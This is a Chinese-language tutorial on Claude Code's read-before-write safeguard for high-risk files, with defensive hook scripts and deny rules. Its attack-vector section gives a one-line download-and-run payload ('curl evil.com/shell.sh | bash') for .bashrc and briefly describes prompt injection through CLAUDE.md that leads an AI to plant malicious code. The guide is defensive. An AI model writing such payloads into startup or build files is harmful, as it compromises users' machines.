# 读前写限制与高风险文件

> 更新日期：2025/06

**TL;DR：** Claude Code 在写入某些"高风险"文件时有额外限制——它必须先读过这个文件，才能去写。这不是权限系统的一部分，而是独立的安全层。Shell 启动文件（`.bashrc`、`.zshrc`）、构建配置（`Makefile`、`Dockerfile`）、Git 配置（`.gitconfig`）都属于高风险文件。理解这个机制能帮你避免"为什么 Claude 拒绝改这个文件"的困惑，也能帮你设计更安全的项目配置。

## 高风险文件

### 哪些文件算高风险

Claude Code 内部维护了一份高风险文件清单。不是所有文件都会触发读前写限制，只有那些被修改后可能产生严重后果的文件才会。主要包括：

**Shell 启动文件**：

| 文件 | 影响 |
|------|------|
| `~/.bashrc` | 每次 bash 启动执行 |
| `~/.zshrc` | 每次 zsh 启动执行 |
| `~/.bash_profile` | 登录 shell 执行 |
| `~/.profile` | 登录 shell 执行 |
| `~/.zprofile` | zsh 登录 shell 执行 |

这些文件被修改后，可能影响你每一次打开终端的行为。写错了（比如 `PATH` 被覆盖），你可能连基本命令都跑不了。

**构建和部署配置**：

| 文件 | 影响 |
|------|------|
| `Dockerfile` | 容器构建流程 |
| `docker-compose.yml` | 容器编排 |
| `Makefile` | 构建流程 |
| `package.json` | 依赖和脚本 |
| `Cargo.toml` | Rust 依赖 |
| `go.mod` | Go 依赖 |
| `pom.xml` / `build.gradle` | Java 构建 |

这些文件控制的是代码如何被编译、打包、部署。改错了可能导致构建失败，更严重的是可能引入供应链安全问题（比如加一个恶意依赖）。

**Git 配置**：

| 文件 | 影响 |
|------|------|
| `.git/config` | 仓库级 Git 配置 |
| `~/.gitconfig` | 全局 Git 配置 |
| `.gitignore` | 忽略规则 |
| `.git/hooks/*` | Git hooks |

改 `.git/config` 可能影响代码的 remote 地址、认证方式。改 hooks 可以在每次 commit/push 时执行任意代码。

**认证和密钥**：

| 文件 | 影响 |
|------|------|
| `.env` / `.env.*` | 环境变量（可能含密钥） |
| `credentials.json` | 凭证文件 |
| `*.pem` / `*.key` | 私钥文件 |
| `~/.ssh/config` | SSH 配置 |
| `~/.npmrc`（含 token） | npm 认证 |

### 为什么这些文件特殊

两个原因：

1. **修改后果严重**。改坏一个普通源文件，最多是某个功能不工作。改坏 `.zshrc`，整个终端环境可能崩溃。改坏 `Dockerfile`，生产环境可能出问题。

2. **执行链风险**。很多配置文件会在某个时刻被自动执行。`.bashrc` 每次开终端都会跑，`Makefile` 每次构建都会跑，Git hooks 每次 commit 都会跑。如果 Claude 在里面写了恶意内容，你可能不知不觉就执行了。

## 读前写限制

### 限制怎么生效

当 Claude 尝试用 `Write` 或 `Edit` 工具修改一个高风险文件时，Claude Code 会检查：这次会话中，Claude 是否已经用 `Read` 工具读过这个文件？

- **已读过** → 正常执行写入操作
- **未读过** → 拒绝写入，要求先读取

这不是权限配置（`permissions.allow` / `permissions.deny`），而是一个独立的内置安全机制。你无法通过 settings.json 关闭它。

### 实际行为

正常工作流：

```
你：帮我给 .zshrc 加一个 alias
Claude：让我先看看 .zshrc 当前的内容。[读取 .zshrc]
Claude：好的，我看到你已经有几个 alias 了。我会在末尾加上新的 alias。[编辑 .zshrc]
```

被拒绝的情况：

```
你：帮我改一下 Makefile 的构建目标
Claude：好的，我来修改 Makefile。[尝试编辑]
系统：需要先读取文件才能编辑。请先使用 Read 工具。
Claude：抱歉，让我先看看 Makefile 的内容。[读取 Makefile]
Claude：现在我可以修改了。[编辑 Makefile]
```

大多数情况下，Claude 会自动处理这个流程——先读后写，你甚至不会注意到这个机制的存在。只有在 Claude "忘记"先读的情况下，你才会看到拒绝提示。

### 对工作流的影响

- **正常使用几乎没有感知**。Claude 通常会先读文件再改，读前写限制只是确保它每次都这样做
- **可能会增加一轮操作**。如果 Claude 试图直接写入一个没读过的文件，会被拒绝一次，然后自动去读
- **不适用于新建文件**。如果文件不存在，Write 创建新文件不受读前写限制

## 执行链风险

### 什么是执行链风险

高风险文件之所以高风险，核心在于它们会被自动执行。攻击路径是：

```
Claude 写入恶意代码到 .bashrc
  → 你打开新终端
    → .bashrc 自动执行
      → 恶意代码运行
        → 你的系统被入侵
```

或者：

```
Claude 写入恶意 Git hook
  → 你 git commit
    → pre-commit hook 自动执行
      → 恶意代码运行
```

这不是假想威胁。Claude 的输出是受 prompt 影响的，如果有人在 CLAUDE.md 或某个被信任的 rules 文件里注入了恶意指令，可能引导 Claude 在高风险文件中写入恶意代码。

### 常见攻击向量

1. **Shell 配置注入**：在 `.bashrc` 里加一行 `curl evil.com/shell.sh | bash`，每次开终端都会执行
2. **PATH 劫持**：在 shell 配置里把 PATH 改成攻击者控制的目录优先
3. **Git hook 投毒**：在 `.git/hooks/pre-commit` 里放恶意脚本
4. **依赖投毒**：在 `package.json` 里加一个恶意依赖
5. **Docker 构建投毒**：在 `Dockerfile` 里加一行从恶意地址下载并执行脚本

### 防护措施

Claude Code 内置的防护：

- **读前写限制**：强制 Claude 先理解文件再修改
- **权限系统**：deny 规则可以完全阻止对某些文件的写入
- **Sandbox**：网络隔离可以限制 Claude 的网络访问

你应该做的：

- **审查修改**：对 shell 配置和构建文件的修改，养成看 diff 的习惯
- **最小权限**：用 deny 规则限制 Claude 对高风险文件的写入
- **版本控制**：重要配置文件保持 git 跟踪，出问题可以回滚
- **备份**：`cp ~/.zshrc ~/.zshrc.bak`，改坏了能快速恢复

## 配置例外

### 不受读前写限制的情况

- **新建文件**：文件不存在时，Write 不受限制
- **非高风险文件**：普通源代码文件（`.ts`、`.py`、`.css` 等）不在高风险清单上
- **Read 以外的方式获取内容**：如果 Claude 通过 `Grep` 或 Bash 命令（如 `cat`）看了文件内容，不等于 Read。读前写限制要求的是用 Read 工具

### 通过 Hooks 自定义行为

你可以用 PreToolUse hooks 实现自己的保护逻辑：

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "bash .claude/hooks/validate-write.sh"
          }
        ]
      }
    ]
  }
}
```

hook 脚本检查写入路径：

```bash
#!/bin/bash
input=$(cat)
file_path=$(echo "$input" | jq -r '.tool_input.file_path')

# 阻止路径遍历
if [[ "$file_path" == *".."* ]]; then
  echo '{"decision": "deny", "reason": "Path traversal detected"}' >&2
  exit 2
fi

# 阻止系统目录
if [[ "$file_path" == "/etc/"* ]] || [[ "$file_path" == "/sys/"* ]]; then
  echo '{"decision": "deny", "reason": "System file"}' >&2
  exit 2
fi

# 阻止敏感文件
if [[ "$file_path" == *".env"* ]]; then
  echo '{"decision": "deny", "reason": "Sensitive file"}' >&2
  exit 2
fi
```

这种方式比 deny 规则更灵活——你可以根据文件内容、路径模式、甚至文件大小来决定是否允许写入。

### 通过 deny 规则完全禁止写入

最简单的防护——直接禁止 Claude 写某些文件：

```json
{
  "permissions": {
    "deny": [
      "Write(./.env*)",
      "Write(./Dockerfile*)",
      "Write(./.git/**)",
      "Edit(./.zshrc)",
      "Edit(./.bashrc)"
    ]
  }
}
```

## 常见问题

### "Claude 拒绝修改 .zshrc，说需要先读取"

这是正常行为。让 Claude 先读取文件，它就能修改了。或者你自己先让 Claude 读一下：

```
先读一下 ~/.zshrc 的内容，然后帮我加一个 alias
```

### "我想让 Claude 完全不能碰 shell 配置文件"

用 deny 规则：

```json
{
  "permissions": {
    "deny": [
      "Read(./.zshrc)",
      "Read(./.bashrc)",
      "Write(./.zshrc)",
      "Write(./.bashrc)",
      "Edit(./.zshrc)",
      "Edit(./.bashrc)"
    ]
  }
}
```

连读都 deny 掉，Claude 就完全碰不到这些文件。

### "读前写限制能关掉吗"

不能通过配置关闭。这是内置的安全机制。如果你确实需要绕过（不推荐），可以：

1. 自己手动改文件，不让 Claude 改
2. 在 Claude 写入前手动触发读取
3. 用 hooks 替代（但不建议绕过安全机制）

### "package.json 算高风险文件吗"

是的。`package.json` 修改可能引入恶意依赖，属于构建配置类别。Claude 修改 package.json 前也会先读取。

### "怎么知道哪些文件触发了读前写限制"

没有直接的命令查看高风险文件清单。但你可以观察行为：如果 Claude 尝试写入时被拒绝并提示需要先读取，那这个文件就在清单上。一般来说，如果你觉得"这个文件被改坏了会很麻烦"，那它大概率在清单上。

## 关键要点

- 高风险文件包括 shell 配置、构建配置、Git 配置、认证文件——修改后果严重的文件
- 读前写限制是内置安全机制，无法关闭：Claude 必须先 Read 才能 Write/Edit 高风险文件
- 执行链风险是核心威胁：高风险文件会在某个时刻被自动执行，写入恶意内容后果严重
- 用 deny 规则可以完全阻止对特定文件的访问，用 hooks 可以实现更灵活的保护
- 审查 Claude 对高风险文件的修改，不要无脑接受
- 读前写限制和权限系统是独立的两层保护，各有各的作用

## 延伸阅读

- [39 - Settings 文件详解](39-settings-files.md) — deny 规则的配置方式
- [45 - Fine-grained Permissions](45-fine-grained-permissions.md) — 权限规则的完整写法
- [63 - Hooks 入门](63-hooks-getting-started.md) — 用 hooks 实现自定义文件保护
- [43 - Permission Modes 全解](43-permission-modes-explained.md) — 权限模式详解
